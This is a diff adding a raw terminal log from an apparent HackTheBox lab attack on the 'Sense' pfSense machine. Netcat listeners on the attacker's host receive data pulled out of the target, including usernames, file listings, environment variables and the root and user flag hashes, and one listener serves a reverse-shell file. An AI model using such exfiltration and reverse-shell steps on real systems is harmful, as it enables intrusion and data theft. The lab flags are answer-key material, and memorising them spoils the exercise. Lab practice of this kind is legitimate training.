@@ -1,0 +1,154 @@
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001                      
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:52305. 
+gyan                                     
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001                      
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:60797. 
+root                                     
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001                      
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:52816. 
+pfSense.localdomain                      
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001 > filesystem.txt     
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:44970. 
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #cat filesystem.txt                 
+.                                        
+./WAN_DHCP-quality.rrd                   
+./wan-traffic.rrd                        
+./wan-packets.rrd                        
+./ipsec-traffic.rrd                      
+./ipsec-packets.rrd                      
+./system-states.rrd                      
+./system-processor.rrd                   
+./system-memory.rrd                      
+./system-mbuf.rrd                        
+./updaterrd.sh                           
+./GW_WAN-quality.rrd                     
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001 > filesystem.txt     
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:7675.  
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #cat filesystem.txt                                                                                                                                              
+.                                        
+./WAN_DHCP-quality.rrd                   
+./wan-traffic.rrd                        
+./wan-packets.rrd                        
+./ipsec-traffic.rrd                      
+./ipsec-packets.rrd                      
+./system-states.rrd                      
+./system-processor.rrd                   
+./system-memory.rrd                      
+./system-mbuf.rrd                        
+./updaterrd.sh                           
+./GW_WAN-quality.rrd                     
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001                      
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:21790. 
+OLDPWD=/                                 
+HOME=/                                   
+PHP_FCGI_MAX_REQUESTS=500                
+PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin                  
+LANG=en_US.ISO8859-1                     
+PHP_FCGI_CHILDREN=1                      
+PWD=/var/db/rrd                          
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001                      
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:9865.  
+/gyan                                    
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001 > filesystem.txt     
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:52066. 
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #less filesystem.txt                
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001                                                                                                                                                   
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:22018. 
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001 > root.txt           
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:9289.  
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #cat root.txt                       
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #file root.txt                      
+root.txt: empty                          
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001 > root.txt           
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:65130. 
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #file root.txt                                                                                                                                                   
+root.txt: ASCII text                     
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #cat root.txt                       
+d08c32a5d4f8c8b10e76eb51a69f1a86         
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #cat filesystem.txt | grep user.txt 
+/home/rohit/user.txt                     
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001 > user.txt                                                                                                                                        
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:45254. 
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #cat user.txt                       
+8721327cc232073b40d27d9c17e7348b┌─[root@parrot]─[~/hackthebox/sense]               
+└──╼ #vi reversee_shell                  
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #vi reversee_shell                  
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #nc -nvlp 9001 < reversee_shell     
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
+Ncat: Listening on :::9001               
+Ncat: Listening on 0.0.0.0:9001          
+Ncat: Connection from 10.10.10.60.       
+Ncat: Connection from 10.10.10.60:14338. 
+┌─[root@parrot]─[~/hackthebox/sense]     
+└──╼ #              
